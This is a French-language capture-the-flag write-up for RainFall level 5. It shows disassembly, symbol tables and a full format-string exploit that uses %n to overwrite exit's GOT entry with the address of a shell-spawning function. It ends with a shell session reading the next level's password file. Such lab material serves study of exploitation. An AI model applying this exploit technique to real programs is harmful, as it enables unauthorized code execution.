# Level 5

```bash
(gdb) disas main 
Dump of assembler code for function main:
   0x08048504 <+0>:	push   ebp
   0x08048505 <+1>:	mov    ebp,esp
   0x08048507 <+3>:	and    esp,0xfffffff0
   0x0804850a <+6>:	call   0x80484c2 <n>
   0x0804850f <+11>:	leave  
   0x08048510 <+12>:	ret    
End of assembler dump.
(gdb) disas n 
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   ebp
   0x080484c3 <+1>:	mov    ebp,esp
   0x080484c5 <+3>:	sub    esp,0x218
   0x080484cb <+9>:	mov    eax,ds:0x8049848
   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:	lea    eax,[ebp-0x208]
   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    eax,[ebp-0x208]
   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
```

```bash
level5@RainFall:~$ objdump -t level5 

level5:     file format elf32-i386

SYMBOL TABLE:
....
080484a4 g     F .text	0000001e              o
08049854 g     O .bss	00000004              m
....
```

```bash
level5@RainFall:~$ objdump -R level5  | grep 'exit'
08049838 R_386_JUMP_SLOT   exit
```

Pour ce niveau une fois l'executable desassembler avec `ghidra` et l'utilisation de `objdump` on remarque que l'on doit appeler la fonction `o` pour executer un shell mais que le programme n'utilise pas de `return` mais plutot `exit`

La solution est donc de reecrire l'adresse d'`exit` dans le `GOT` (Global Offset Table un tableau contenant toutes les adresses des fonctions de la `libc` trouve dynamiquement) par l'adresse de la fonction `o`

Cherchons aussi l'offset de notre buffer qui est `4`
```bash
level5@RainFall:~$ ./level5 <<< $(python -c 'print "AAAA" + "%x " * 5')
AAAA200 b7fd1ac0 b7ff37d0 41414141 25207825
```

L’adresse de la fonction `o` etant `0x080484a4` soit `134513828` en decimal et sachant que les 4 premiers octets correspondant à l’adresse de `exit@GOT` sont deja imprimes le padding est ajuste à `134513824`
L’utilisation de `%n` permet ici d’ecrire directement les 4 octets de l’adresse de `o` en une seule fois

```bash
level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"'; cat) | ./level5
whoami
level6
cat /home/user/level6/.pass
********************************************************
```